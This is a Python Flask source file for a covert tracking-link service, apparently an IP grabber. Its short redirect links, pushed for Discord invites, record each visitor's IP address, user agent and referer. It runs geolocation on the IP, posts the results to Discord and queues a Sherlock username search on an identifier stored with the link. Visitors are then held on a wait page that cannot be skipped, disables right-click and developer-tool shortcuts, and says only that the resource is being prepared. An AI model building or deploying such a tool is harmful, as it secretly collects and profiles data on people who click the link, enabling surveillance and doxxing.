import os
import json
import uuid
from datetime import datetime
from urllib.parse import urlparse

from flask import Flask, request, jsonify, abort, render_template_string

from tasks import geoip_lookup, detect_ua_info, send_discord_embed, run_sherlock_task

# Config from environment
REPO_ROOT = os.environ.get('REPO_ROOT', os.getcwd())
DATA_DIR = os.environ.get('DATA_DIR', os.path.join(REPO_ROOT, 'tracker_data'))
STORE_FILE = os.environ.get('STORE_FILE', os.path.join(DATA_DIR, 'store.json'))
PUBLIC_BASE = os.environ.get('PUBLIC_BASE', 'http://localhost:5000').rstrip('/')
APPEND_WHITELIST = [s.strip() for s in os.environ.get('APPEND_WHITELIST', 'github.com,example.com').split(',') if s.strip()]
HOOK_TOKEN = os.environ.get('HOOK_TOKEN')
INTERSTITIAL_DELAY = int(os.environ.get('INTERSTITIAL_DELAY', '5'))

os.makedirs(DATA_DIR, exist_ok=True)

app = Flask(__name__)


def load_store():
    if not os.path.isfile(STORE_FILE):
        return {"redirects": {}}
    try:
        with open(STORE_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return {"redirects": {}}


def save_store(s):
    tmp = STORE_FILE + ".tmp"
    with open(tmp, 'w', encoding='utf-8') as f:
        json.dump(s, f, indent=2, ensure_ascii=False)
    os.replace(tmp, STORE_FILE)


def make_slug():
    return uuid.uuid4().hex[:10]


def is_whitelisted_for_append(url):
    try:
        u = urlparse(url)
        host = (u.hostname or '').lower()
        return any(host.endswith(w.lower()) for w in APPEND_WHITELIST)
    except Exception:
        return False


def is_discord_invite(url):
    """
    Detect Discord invite links: discord.gg/* or discord.com/invite/*
    """
    try:
        u = urlparse(url)
        host = (u.hostname or '').lower()
        path = (u.path or '').lower()
        if host.endswith('discord.gg'):
            return True
        if 'discord.com' in host and '/invite' in path:
            return True
    except Exception:
        pass
    return False


# Interstitial template (no skip button). Uses INTERSTITIAL_DELAY seconds (JS countdown).
INTERSTITIAL_TEMPLATE = """
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Preparing resource...</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta http-equiv="X-Content-Type-Options" content="nosniff">
  <meta http-equiv="X-Frame-Options" content="DENY">
  <meta name="referrer" content="no-referrer">
  <style>
    body { background:#0b0f14; color:#e6eef6; font-family:Helvetica,Arial,sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
    .card { width:94%; max-width:760px; background:#1b2228; padding:20px; border-radius:8px; box-shadow:0 8px 30px rgba(0,0,0,0.6); border-left:6px solid #1dd1a1; }
    h1 { margin:0 0 6px; font-size:20px; }
    p { margin:6px 0; color:#cbd5df; }
    .count { font-size:56px; color:#1dd1a1; text-align:center; margin:14px 0; font-weight:700; }
    .small { font-size:13px; color:#9fb0bd; }
    .orig { margin-top:12px; word-break:break-all; color:#9fb0bd; font-size:14px; }
    .note { margin-top:8px; font-size:12px; color:#93a7b5; }
    .orig a { pointer-events: none; color:#9fb0bd; text-decoration:none; }
  </style>
</head>
<body>
  <div class="card" role="status" aria-live="polite">
    <h1>Preparing resource — please wait</h1>
    <p class="small">Por seguridad, estamos preparando el recurso. Serás redirigido automáticamente en breve.</p>
    <div class="count" id="count">{{ delay }}</div>
    <p class="small">Endpoint: {{ endpoint }} — Capturado: {{ received_at }}</p>
    <div class="orig"><strong>Destino:</strong><br><span id="origText">{{ original_url }}</span></div>
    <p class="note">No es posible omitir esta espera. Si necesitas abrir el enlace ahora, copia manualmente la URL indicada arriba.</p>
  </div>

  <script>
    // disable context menu & some shortcuts to reduce skipping attempts
    window.addEventListener('contextmenu', function(e){ e.preventDefault(); }, {capture: true});
    window.addEventListener('keydown', function(e){
      if ((e.ctrlKey || e.metaKey) && (e.key === 't' || e.key === 'T' || e.key === 'u' || e.key === 'U' || (e.shiftKey && (e.key === 'I' || e.key === 'i')))) {
        e.preventDefault(); e.stopPropagation();
      }
      if (e.key === 'F12') { e.preventDefault(); e.stopPropagation(); }
    }, {capture:true});

    (function(){
      var t = {{ delay }};
      var el = document.getElementById('count');
      var orig = "{{ original_url }}";
      // meta refresh fallback
      var meta = document.createElement('meta');
      meta.httpEquiv = "refresh";
      meta.content = "{{ delay_plus_one }};url=" + orig;
      document.getElementsByTagName('head')[0].appendChild(meta);

      var timer = setInterval(function(){
        t -= 1;
        el.textContent = t;
        if(t <= 0) {
          clearInterval(timer);
          window.location.replace(orig);
        }
      }, 1000);
    })();
  </script>
</body>
</html>
"""


@app.route('/convert', methods=['POST'])
def convert():
    # simple authentication via HOOK_TOKEN header
    if HOOK_TOKEN:
        token = request.headers.get('x-hook-token') or request.headers.get('authorization')
        if not token or token != HOOK_TOKEN:
            return jsonify({"error": "unauthorized"}), 401

    data = request.get_json(force=True) or {}
    url = data.get('url')
    prefer = data.get('prefer', 'auto')
    identifier = data.get('identifier')
    resource_name = data.get('name') or ''

    if not url:
        return jsonify({"error": "missing url"}), 400

    # force redirect for Discord invites
    if is_discord_invite(url):
        prefer = 'redirect'

    # decide append vs redirect
    if prefer == 'append' or (prefer == 'auto' and is_whitelisted_for_append(url)):
        # create an appended url (do not change domain)
        sep = '&' if '?' in url else '?'
        appended = f"{url}{sep}orig=1"
        return jsonify({"mode": "append", "appended_url": appended}), 200
    else:
        # create short redirect
        s = load_store()
        slug = make_slug()
        s.setdefault('redirects', {})[slug] = {
            "url": url,
            "created_at": datetime.utcnow().isoformat(),
            "identifier": identifier,
            "resource_name": resource_name,
            "meta": data.get('meta', {})
        }
        save_store(s)
        short = f"{PUBLIC_BASE}/r/{slug}"
        return jsonify({"mode": "redirect", "short_url": short, "slug": slug}), 201


@app.route('/r/<slug>', methods=['GET'])
def tracked_redirect(slug):
    s = load_store()
    entry = s.get('redirects', {}).get(slug)
    if not entry:
        return abort(404)

    # immediate capture of visitor info
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '')
    referer = request.headers.get('Referer', '')
    received_at = datetime.utcnow().isoformat()

    hit = {
        "slug": slug,
        "ip": ip,
        "user_agent": ua,
        "referer": referer,
        "received_at": received_at,
        "endpoint": f"/r/{slug}",
        "resource_name": entry.get('resource_name', ''),
        "original_url": entry.get('url')
    }

    # quick geoip and ua parse
    geo = geoip_lookup(ip)
    ua_info = detect_ua_info(ua)

    # send embed asynchronously (non-blocking)
    try:
        from threading import Thread

        def send_embed_later():
            send_discord_embed(hit, geo, ua_info, vpninfo=None, original_url=entry.get('url'))

        Thread(target=send_embed_later, daemon=True).start()
    except Exception:
        pass

    # enqueue Sherlock if identifier present
    identifier = entry.get('identifier')
    if identifier:
        try:
            run_sherlock_task.delay(identifier, {"ip": ip, "ua": ua, "referer": referer, "slug": slug})
        except Exception:
            # best-effort: ignore enqueue failure
            pass

    # persist access log
    s.setdefault('redirects', {}).setdefault(slug, {}).setdefault('hits', []).append({
        "ip": ip, "ua": ua, "referer": referer, "at": received_at
    })
    save_store(s)

    # Return interstitial page (client-side redirect after INTERSTITIAL_DELAY)
    html = render_template_string(
        INTERSTITIAL_TEMPLATE,
        endpoint=f"/r/{slug}",
        received_at=received_at,
        original_url=entry.get('url'),
        delay=INTERSTITIAL_DELAY,
        delay_plus_one=INTERSTITIAL_DELAY + 1
    )
    return html, 200, {'Content-Type': 'text/html; charset=utf-8'}


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', '5000')))